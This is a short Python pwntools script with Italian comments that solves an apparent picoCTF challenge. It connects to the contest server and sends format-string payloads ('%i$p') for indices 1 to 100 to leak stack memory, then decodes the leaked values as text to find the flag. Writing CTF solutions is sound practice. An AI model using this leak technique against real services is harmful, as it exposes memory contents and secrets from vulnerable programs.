from pwn import *

# Opzionale: pulisce l'output di pwntools per vedere solo i tuoi print
context.log_level = 'warn' 

for i in range(1, 101): # Solitamente gli indici di format string partono da 1
    try:
        p = remote("mimas.picoctf.net", 52468)
        
        # Aspetta il prompt
        p.recvuntil(b"read it back to you:")
        
        # Formatta correttamente la stringa con l'indice i
        payload = f"%{i}$p".encode() # Usa %p invece di %s
        p.sendline(payload)
        
        risposta = p.recvall(timeout=1).decode(errors='ignore')
        
        # Estrai solo la parte esadecimale dopo "Here's your order: "
        if "Here's your order: " in risposta:
            hex_val = risposta.split("Here's your order: ")[1].split("\n")[0].strip()
            
            # Prova a convertirlo da hex a testo (Little-Endian)
            try:
                # Rimuove '0x', inverte i byte (Little Endian) e decodifica
                clean_hex = hex_val.replace("0x", "")
                if len(clean_hex) % 2 != 0: clean_hex = "0" + clean_hex
                decoded = bytes.fromhex(clean_hex)[::-1].decode('ascii', errors='ignore')
                print(f"Indice {i:3}: {hex_val:18} | Testo: {decoded}")
            except:
                print(f"Indice {i:3}: {hex_val:18} | Testo: ---")
            finally:
                p.close()
    finally:
        print(" ")
